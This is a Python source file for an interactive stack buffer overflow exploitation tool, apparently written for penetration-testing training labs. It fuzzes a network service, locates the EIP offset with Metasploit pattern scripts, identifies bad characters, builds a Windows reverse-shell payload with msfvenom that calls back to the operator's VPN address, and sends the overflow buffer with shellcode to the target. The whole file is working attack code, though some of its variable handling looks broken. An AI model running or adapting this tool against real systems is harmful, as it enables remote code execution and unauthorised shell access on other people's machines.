import binascii, os, socket, struct, time
from typing import Union

ascii_art = """
 ______   _______           _        _______ _________ _______  _______ 
(  __  \ (  ___  )|\     /|( (    /|(  ____ \\__   __/(  ___  )(  ____ )
| (  \  )| (   ) || )   ( ||  \  ( || (    \/   ) (   | (   ) || (    )|
| |   ) || (___) || | _ | ||   \ | || (_____    | |   | (___) || (____)|
| |   | ||  ___  || |( )| || (\ \) |(_____  )   | |   |  ___  ||     __)
| |   ) || (   ) || || || || | \   |      ) |   | |   | (   ) || (\ (   
| (__/  )| )   ( || () () || )  \  |/\____) |   | |   | )   ( || ) \ \__
(______/ |/     \|(_______)|/    )_)\_______)   )_(   |/     \||/   \__/
"""

print(ascii_art)


def execute(command: str) -> None:
    """function to execute command and print out the command"""
    print(f"[+] Executing: {command}")
    os.system(command)


def send_data(data: Union[bytes, str], timeout: int = 5) -> None:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.settimeout(timeout)
        s.connect((ip, port))

        if not noreceive:
            print("[+] Received: ", s.recv(1024).decode())

        if isinstance(data, str):
            data = data.encode()

        s.send(data)
        print("[+] Sent: {}".format(data))

        response = s.recv(1024).decode()
        print("[+] Received: ", response)
    except socket.timeout:
        print("[-] Socket timeout occurred")
    except Exception as e:
        print(f"[-] Error: {e}")

def fuzz(start: int = 100, end: int = 10000, step: int = 100) -> int:
# fuzz the application with increasing size of buffer
  try:
    while start <= end:
        fuzz_str = "A" * start
        print("[+] Fuzzing with %s bytes" % len(fuzz_str))
        # Ensure prefix and suffix are bytes
        send_data(prefix + fuzz_str.encode() + suffix)
        time.sleep(1)
        start += step
  except ConnectionRefusedError:
    print("[-] Connection refused")
    return start - step  # Return the last successful buffer size
  except socket.timeout:
    print(f"[!] Potential crash detected at: {start}")
    return start
  return 0  # Return 0 if no crash is detected


def send_cyclic(offset: int) -> int:
    """Cyclic pattern to send to the app, and check for the exact pattern"""
    print("\n[+] Creating cyclic pattern with offset")
    command = f"{msf}/tools/exploit/pattern_create.rb -l {offset} > pattern.buf"
    execute(command)
    buffer = open("pattern.buf", "r").read()
    print("[!] Restart the app")
    input("[~] Press enter to send cyclic pattern")

    try:
        if suffix != b"\n":
            send_data(prefix + buffer.encode() + suffix)
        else:
            send_data(prefix + buffer.encode())
    except socket.timeout:
        print("[~] Crashed the app, check the EIP")

    eip = input("[?] Enter EIP value: ")

    command = f"{msf}/tools/exploit/pattern_offset.rb -q {eip.strip()}" + " | awk '{print $6}' > /tmp/offset"
    execute(command)

    with open("/tmp/offset", "r") as fp:
        content = fp.read()
        if content == "":
            print("[-] Unable to get a match")
            exit()
        else:
            offset = content.strip("\n")
            print(f"[+] Offset found at address {offset}")
            return int(offset)


def generate_chars(badchars: [str]) -> bytes:
    """
    generate all chars after filtering out badchars
    :param badchars: ["\\x0a", "\\x0d"]
    :return: "0102.."
    """
    char_str = ""

    for x in range(1, 256):
        current_char = "\\x" + '{:02x}'.format(x)

        if current_char not in badchars:
            char_str += current_char[2:]
            # remove the leading "\x"
    return binascii.unhexlify(char_str)


def badchars_esp(offset: int) -> str:
    print("\n[!] Restart the app")
    input("[+] Press enter to send bad chars")
    print("[!] Pro tip: !mona bytearray -f \"\\x00\"")

    # default badchar as \x00
    current_badchars = ["\\x00"]

    while True:
        # convert the hexstring into binary
        allchars = generate_chars(current_badchars)

        padding = "A" * offset
        eip = "B" * 4
        esp = "C" * 8

        buffer = padding.encode() + eip.encode() + allchars

        try:
            print("[?] Sending buffer")
            send_data(prefix + buffer + suffix)
        except socket.timeout:
            print("\n[+] allchars sent")

        print("[+] Current_badchars: ", current_badchars)
        print("[!] Pro tip: !mona compare -f c:\\path\\bytearray.bin -a esp")
        print("[!] Restart the app")
        command = input("[+] Enter badchar (\\x00 \\x01 ..) to filter out (type 'exit' to skip): ").strip()
        if command == "exit":
            break
        elif " " in command:
            current_badchars.extend(command.split(" "))
        elif command != "":
            current_badchars.append(command)

    print("[+] Badchars detected: ", "".join(current_badchars))
    return "".join(current_badchars)


def badchars_not_esp(offset: int) -> str:
    current_badchars = ["\\x00"]

    while True:
        # convert the hexstring into binary
        allchars = generate_chars(current_badchars)

        number = input("[+] Enter amount to send (enter to sendall, exit to end): ").strip()
        if number == "exit":
            break
        elif number == "":
            number = len(allchars)

        bindex = int(number)
        if bindex > len(allchars):
            bindex = len(allchars)

        # steps, send all 255, does it crash?

        padding = "A" * offset
        eip = "B" * 4
        esp = "C" * 8

        # buffer not in ESP
        buffer = allchars[:bindex] + padding[len(allchars[:bindex]):].encode() + eip.encode() + esp.encode()

        try:
            send_data(prefix + buffer + suffix)
        except socket.timeout:
            print("\n[+] Allchars sent")

        print("[+] Current_badchars: ", current_badchars)
        command = input("[+] Enter badchar to filter out (enter to skip): ").strip()
        if command == "exit":
            break
        elif " " in command:
            current_badchars.extend(command.split(" "))
        elif command != "":
            current_badchars.append(command)

    print("[+] Badchars detected: ", "".join(current_badchars))
    return "".join(current_badchars)


def shell_gen(badchars: str) -> None:
    """Generates the shellcode using the vpn tunnel ip address"""
    execute(f"ip addr show {interface} | grep 'inet ' | " + "awk '{print $2}' | cut -d'/' -f1 > /tmp/ip")
    ip = open("/tmp/ip", "r").read().strip()
    print(f"[+] IP Detected: {ip}")

    command = f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={rport} EXITFUNC=thread -b \"{badchars}\" -f raw > /tmp/shellcode 2>/dev/null"
    execute(command)
    print("[+] Generated shellcode at /tmp/shellcode")


def exploit(offset: int, badchars: str) -> None:
    global eip_str

    print(f"[!] Pro tip: !mona jmp -r esp -cpb \"{badchars}\"")
    print("[!] Restart the app")
    eip_str = input("[+] Enter EIP address to overwrite (without 0x): ").strip()

    padding = "A" * offset
    eip = struct.pack("<I", int(eip_str, 16))
    nops = binascii.unhexlify("90" * 32)

    shellcode = open("/tmp/shellcode", "rb").read()
    print(f"[+] Loaded shellcode of size: {len(shellcode)} bytes")

    # only if first stage payload required
    # from pwn import asm
    #  register = input("Enter payload register (esp): ").strip()
    #  assembly = asm(f"jmp {register}; add eax, 4")
    #  padding_offset = len(padding) - len(nops) + len(shellcode)
    #  buffer = nops + shellcode + padding[padding_offset:].encode() + eip + esp.encode()

    try:
        buffer = padding.encode() + eip + nops + shellcode
        print("[=] Buffer to be sent: ", buffer)
        print("[+] Exploiting.. ")
        send_data(prefix + buffer + suffix)
    except socket.timeout:
        print("[+] Payload sent but timed out")

    print("[+] Exploitation completed")


def check_esp(offset: int) -> None:
    """function check if esp has enough room for shellcode"""
    padding = "A" * offset
    eip = "B" * 4
    esp = "C" * 500

    print("[!] Restart the app")
    input("[=] Press enter to send huge buffer (500 bytes of C) to check for space on ESP")
    buffer = padding.encode() + eip.encode() + esp.encode()

    try:
        print("[?] Sending buffer")
        send_data(prefix + buffer + suffix)
    except socket.timeout:
        print("[+] Buffer sent, check for the ESP register content")


def main(ip, port, offset, prefix, suffix, rport, interface, msf, noreceive, newline, step):
    """main function to start the exploit"""

    # if offset is not given from args, then fuzz
    if offset == 0:
        offset = fuzz()
        offset = send_cyclic(offset)

    check_esp(offset)
    question = input("[?] Is the payload small enough to be sent in ESP (y/n): ").strip()
    payload_in_esp = question.lower() == "y"

    if payload_in_esp:
        badchars = badchars_esp(offset)
    else:
        badchars = badchars_not_esp(offset)

    shell_gen(badchars)
    exploit(offset, badchars)

    print("\n[+] Exploit Info")
    print(f"[+] Address: {ip}:{port}")
    print(f"[+] EIP offset: {offset} bytes")
    print(f"[+] EIP value: 0x{eip_str}")
    print(f"[+] Bad chars: {badchars}")
    print(f"[+] Shell code: msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={rport} EXITFUNC=thread -b \"{badchars}\" -f python -v shellcode")


if __name__ == "__main__":
  import argparse

  questionMan = input("Manual command input - Yes/No: ").strip().lower()

  if questionMan == "no":
      ip = input("Type the IP: ")
      port = int(input("Type the port: "))

      # Set default values
      offset = 0
      prefix = b""
      suffix = b""
      rport = 443
      interface = "tun0"
      msf = "/usr/share/metasploit-framework"
      noreceive = False
      newline = False
      step = 100

      main(ip, port, offset, prefix, suffix, rport, interface, msf, noreceive, newline, step)
  else:
      parser = argparse.ArgumentParser(description="Buffer overflow exploit testing tool")
      parser.add_argument("--offset", help="EIP offset if already known, this will skip offset finding", default=0)
      parser.add_argument("--prefix", help="Prefix of the string to send", default="")
      parser.add_argument("--suffix", help="Suffix of the string to send", default="")
      parser.add_argument("--ip", help="Target IP address", required=True)
      parser.add_argument("--port", help="Target port to exploit", required=True)
      parser.add_argument("--rport", help="Reverse shell port", default=443)
      parser.add_argument("--interface", help="The interface to use", default="tun0")
      parser.add_argument("--msf", help="Metasploit framework directory to use", default="/usr/share/metasploit-framework")
      parser.add_argument("--noreceive", help="Use if the program doesn't send an initial response on connect", action="store_true")
      parser.add_argument("--newline", help="Add newline character to the end of the sent data", action="store_true")
      parser.add_argument("--step", help="Step increment for fuzzing, default 100", default=100)

      args = parser.parse_args()

      if args.newline:
          args.suffix += "\n"

      main(args.ip, int(args.port), int(args.offset), args.prefix, args.suffix, 
           int(args.rport), args.interface, args.msf, args.noreceive, args.newline, int(args.step))